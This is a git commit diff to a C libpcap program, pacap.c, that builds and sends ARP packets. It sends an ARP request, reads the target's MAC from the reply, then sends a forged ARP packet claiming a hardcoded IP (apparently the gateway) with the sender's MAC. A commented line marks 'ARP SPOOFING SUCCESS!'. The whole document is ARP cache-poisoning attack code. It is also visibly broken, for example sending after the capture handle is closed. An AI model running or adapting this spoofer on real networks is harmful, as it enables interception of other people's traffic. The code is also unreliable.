c7610d8875480edbc28ca37a138137025149d6c4
null0422 <null0422@gmail.com>
2017-07-31 23:23:25 -0400

    last ver

--- pacap.c
+++ pacap.c
@@ -9,6 +9,7 @@
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
 #include <stdint.h>
+#include <string.h>
 
 struct sniff_arp {
 	u_char eth_smac[6];
@@ -22,6 +23,7 @@ struct sniff_arp {
 	u_char arp_smac[6]; /*sender mac address*/
 	u_char arp_sip[4]; /*sender ip address*/
 	u_char arp_dmac[6]; /*target mac address*/
+	int arp_dmac2[6];
 	u_char arp_dip[4]; /*target ip address*/
 };
 
@@ -31,7 +33,7 @@ int main(int argc, char *argv[])
 	char *dev;			/*The device to sniff on*/
 	char errbuf[PCAP_ERRBUF_SIZE];	/*Error string*/
 	struct bpf_program fp;		/*The compiled filter*/
-	char filter_exp[] = "port 80";	/*The filter expression*/
+	char filter_exp[] = "arp";	/*The filter expression*/
 	bpf_u_int32 mask;		/*Our netmask*/
 	bpf_u_int32 net;		/*Our IP*/
 	struct pcap_pkthdr *header;	/*The header that pcap gives us*/
@@ -40,12 +42,11 @@ int main(int argc, char *argv[])
 	struct sniff_arp arp;
 
 	const u_char *pkt_data;
-	int cnt=0;
-	int pcnt=0;
-	int idx,x,y;
+	int idx,j=0;
+	u_char temp[6];
 	
-	struct ip *ip_hdr;
-	struct tcphdr *tcph;
+//	struct ip *ip_hdr;
+//	struct tcphdr *tcph;
 
 	
 	/*Define the device*/
@@ -82,109 +83,86 @@ int main(int argc, char *argv[])
 			return (2);
 		}
 
-	sscnaf(argv[2], "%d.%d.%d.%d", &arp.arp_dip[0], &arp.arp_dip[1], &arp.arp_dip[2], &arp.arp_dip[3]);
+	sscanf(argv[2], "%d.%d.%d.%d", &arp.arp_dip[0], &arp.arp_dip[1], &arp.arp_dip[2], &arp.arp_dip[3]);
 	char *NIC = argv[1];
 
+/*
 	FILE *fp_ip;
 	char i_buff[256];
 	fp_ip = popen("ifconfig eth0 | grep inet", "r");
 	fgets(i_buff, 255, fp_ip);
 	pclose(fp_ip);
-	sscnaf(fp_ip, "%d.%d.%d.%d", &arp.arp_sip[0], &arp.arp_sip[1], &arp.arp_sip[2], &arp.arp_sip[3]);
+	sscanf(i_buff, "%d.%d.%d.%d", &arp.arp_sip[0], &arp.arp_sip[1], &arp.arp_sip[2], &arp.arp_sip[3]);
 
+	printf("%d", i_buff);
 	FILE *fp_mac;
 	char m_buff[256];
 	fp_mac = popen("ifconfig eth0 | grep ether", "r");
 	fgets(m_buff, 255, fp_mac);
 	pclose(fp_mac);
-	sscnaf(fp_mac, "%x:%x:%x:%x:%x:%x", &arp.eth_smac[0], &arp.eth_smac[1], &arp.eth_smac[2], &arp.eth_smac[3], &arp.eth_smac[4], &arp.eth_smac[5]);
+	sscanf(fp_mac, "%x:%x:%x:%x:%x:%x", &arp.eth_smac[0], &arp.eth_smac[1], &arp.eth_smac[2], &arp.eth_smac[3], &arp.eth_smac[4], &arp.eth_smac[5]);
+*/
 
-	arp.eth_dmac[0] = 0xFF;
+	/*arp.eth_dmac[0] = 0xFF;
 	arp.eth_dmac[1] = 0xFF;
 	arp.eth_dmac[2] = 0xFF;
 	arp.eth_dmac[3] = 0xFF;
 	arp.eth_dmac[4] = 0xFF;
 	arp.eth_dmac[5] = 0xFF;
-
-	arp.eth_type = 0x0806;
+	*/
+	memcpy(arp.eth_dmac , "\xff\xff\xff\xff\xff\xff" , 6);
+	memcpy(arp.eth_smac, "\x00\x0c\x29\x93\x73\x3c",6);
+	memcpy(arp.arp_sip, "\xc0\xa8\x3a\x86",4);
+	arp.eth_type = htons(0x0806);
 	arp.arp_htype = htons(1);
-	arp.arp_p = 0x0800;
+	arp.arp_p = htons(0x0800);
+
 	arp.arp_hsize = 0x06;
 	arp.arp_psize = 0x04;
-	arp.arp_opcode = 0x0001;
+	arp.arp_opcode = htons(0x0001);
 	memcpy(arp.arp_smac,arp.eth_smac,sizeof(arp.eth_smac));
 	memcpy(arp.arp_dmac,arp.eth_dmac,sizeof(arp.eth_dmac));
 
-	pcap_sendpacket(handle, (void*)arp, sizeof(arp));
-		
+	int fd = pcap_sendpacket(handle, (u_char *)&arp, sizeof(arp));
+	if (fd == -1)
+		printf("error\n");
+
+//	printf("%x %x %x %x %x %x \n\n", &arp.eth_smac[0], &arp.eth_smac[1], &arp.eth_smac[2], &arp.eth_smac[3], &arp.eth_smac[4], &arp.eth_smac[5]);
+//	printf("%d %d %d %d \n\n", &arp.arp_sip[0], &arp.arp_sip[1], &arp.arp_sip[2], &arp.arp_sip[3]);
 	/*Grab a success*/
 
-/*
 	if(success = pcap_next_ex(handle, &header, &pkt_data)>=0)
-	{
-		
-		
-
-		
-		int leng = header->len;
-		for (idx = 0; idx < leng; idx++) {
-			if(*(pkt_data + idx) < 16)
-				printf("0%x ", (*(pkt_data + idx) & 0xff));
-			else
-				printf("%x ", (*(pkt_data + idx) & 0xff));
-			if(idx%16==15)
-				printf("\n");
-			else if(idx%16==7)
-				printf(" ");
-			
+	{	
+		for(int i=22; i<=27; i++) {
+			printf("%x",(*(pkt_data + i)));
+			arp.eth_dmac[j] = (*(pkt_data + i));
+			j++;
 		}
-		printf("\nDMac address : ");
-		for(idx=0; idx<6; idx++)
-			printf("%x ",(*(pkt_data + idx) & 0xff));
-		printf("\nSMAC address : ");
-		for(idx=6; idx<12; idx++)
-			printf("%x ",(*(pkt_data + idx) & 0xff));
-
-		struct ether_header *ep;
-		unsigned short ether_type;
-
-		ep = (struct ether_header *)pkt_data;
-		//ether_type = ntoh(ep->ether_type);
-			int ip_hdr_len = ip_hdr->ip_hl * 4;
-
-		ip_hdr = (pkt_data + sizeof(struct ether_header));
-		tcph = (pkt_data + sizeof(struct ether_header) + ip_hdr_len);
-
-		struct in_addr src_ip = ip_hdr->ip_src;
-		struct in_addr dst_ip = ip_hdr->ip_dst;
-
-		char src_ip_str[25];
-		char dst_ip_str[25];
-		inet_ntop(AF_INET, &src_ip, src_ip_str, 24);
-		inet_ntop(AF_INET, &dst_ip, dst_ip_str, 24);
-
-		printf("\nS-IP: %s ",&(src_ip_str));
-		printf("\nD-IP : %s ",&(dst_ip_str));
-
-		printf("\nS-Port : %d", ntohs(tcph->th_sport));
-		printf("\nD-Port : %d", ntohs(tcph->th_dport));
-		printf("\n ");
-		
-		int tcp_hdr_len = tcph->th_off * 4;
-		int offset = sizeof(struct ether_header) + ip_hdr_len + tcp_hdr_len;
-
-		for(idx=offset; idx<=header->len; idx++)
-			printf("%c", *(pkt_data + idx));		
-		
-		
-		printf("\n\n\n\n");
-
-
+		printf("\n");
 	}
-
 	pcap_close(handle);
-	*/
-	
+/*
+	arp.arp_dmac2[0] = temp[0];
+	arp.arp_dmac2[1] = temp[1];
+	arp.arp_dmac2[2] = temp[2];
+	arp.arp_dmac2[3] = temp[3];
+	arp.arp_dmac2[4] = temp[4];
+	arp.arp_dmac2[5] = temp[5];
+*/
+	memcpy(arp.eth_dmac,arp.arp_dmac,6);
+	memcpy(arp.arp_sip, "\xc0\xa8\x3a\x02",4);
+
+	printf("%x \n", arp.arp_dmac2);
+	printf("%x \n", temp[2]);
+
+	fd = pcap_sendpacket(handle, (u_char *)&arp, sizeof(arp));
+	if (fd == -1)
+		printf("error\n");
+
+/*	{
+		printf("ARP SPOOFING SUCCESS!");
+	}
+*/
 	return(0);
 }		
 	
